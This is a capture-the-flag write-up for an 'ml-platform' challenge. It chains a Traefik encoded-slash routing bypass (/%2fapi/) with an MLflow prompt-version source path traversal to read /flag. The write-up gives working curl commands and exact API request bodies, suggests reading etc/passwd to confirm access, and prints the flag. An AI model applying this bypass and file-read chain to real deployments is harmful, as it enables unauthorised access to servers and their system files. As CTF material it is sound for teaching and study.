# ml-platform

### Author: NeX

## TR;DR
Two bugs are chained here.
1. CVE-2025-66490 - Fixed [here](https://github.com/traefik/traefik/pull/12360) and re-introduced under default config [here](https://github.com/traefik/traefik/pull/12540). i.e. `/%2fapi/` doesn't get decoded by traefik and it gets sent to the underlying service as-is.
2. There's a path traversal when adding a new prompt model in the registry using its source path. Later on retrieving an artifact from this model will fetch it from the previously specified path (i.e. `/`). The path traversal check rejects `file://` and paths starting with `/`. But a path starting with `../` doesn't get rejected.


## Initial state
The dashboard loads without credentials, but everything under the API prefixes is gated:

```
$ curl -i -X POST http://127.0.0.1:8080/api/2.0/mlflow/registered-models/create
HTTP/1.1 401 Unauthorized
```

The config makes it clear what's blocked and what isn't:

```yaml
mlflow-api:
  rule: "PathPrefix(`/api`) || PathPrefix(`/ajax-api`) || PathPrefix(`/model-versions`) || PathPrefix(`/graphql`)"
  middlewares: [mlflow-auth]
mlflow-ui:
  rule: "PathPrefix(`/`)"
```

The password is random and gets regenerated on every start, so guessing it isn't the way in.

## Step 1: getting past Traefik

Traefik matches its router rules against the encoded path but forwards the request without decoding it. MLflow decodes the path before routing. The two never agree on what the path is, and that gap is the bug.

Send `/%2fapi/...` and the two sides read it differently:

* To Traefik the path starts with `/%2f`, not `/api`, so it misses the protected router and drops into the `/` catch-all. No auth runs.
* MLflow gets the path untouched, decodes `%2f` back to `/`, collapses the leading `//`, and serves `/api/...`.

```
$ curl -i --path-as-is 'http://127.0.0.1:8080/%2fapi/2.0/mlflow/experiments/search?max_results=1'
HTTP/1.1 200 OK
{"experiments": [...]}
```

The same prefix works on every gated route, `/%2fmodel-versions/...` included. The encoded slash has to sit at the front though. `/api%2f2.0/...` still starts with `/api`, so it matches the protected router and you get 401 again.

Traefik can block this with `encodedCharacters.allowEncodedSlash`, but it's been opt-in since v3.6.7, so a default install on the current release is open.

## Step 2: reading the flag

We can reach the API now, but the flag is a file at `/flag`, not something MLflow tracks, so the API on its own gets us nowhere. We need a file read.

The model registry lets you set a `source` on a model version, and `get-artifact` later reads files from that source path. Point the source at the filesystem root and you can read whatever you want. There's a check on the source, but it only runs when the source has a URL scheme:

```python
if parsed.scheme == "file" or (parsed.scheme == "" and source.startswith("/")):
    raise MlflowException(...)
# Only validate traversal for sources with a URL scheme (http, https, etc.)
if parsed.scheme:
    _validate_non_local_source_contains_relative_paths(source)
```

`file:` URIs and absolute paths get rejected, but a bare relative path like `../../../..` has no scheme and doesn't start with `/`, so it passes and gets stored as written. One catch: this only holds for a prompt version (the `mlflow.prompt.is_prompt` tag). A normal model version validates its source against a run's artifact directory and rejects it. That leaves three requests:

```
POST /%2fapi/2.0/mlflow/registered-models/create
     {"name":"x","tags":[{"key":"mlflow.prompt.is_prompt","value":"true"}]}

POST /%2fapi/2.0/mlflow/model-versions/create
     {"name":"x","source":"../../../../../../../..","tags":[<same tag>]}

GET  /%2fmodel-versions/get-artifact?name=x&version=1&path=flag
```

The `path` parameter is also checked for traversal, but that doesn't matter here since the traversal is already in the source root, not in `path`. If you want to confirm the read first, swap `path=flag` for `path=etc/passwd`.

## Flag

```
L3AK{y0u_w3re_supp0s3d_t0_b3_f1ne}
```
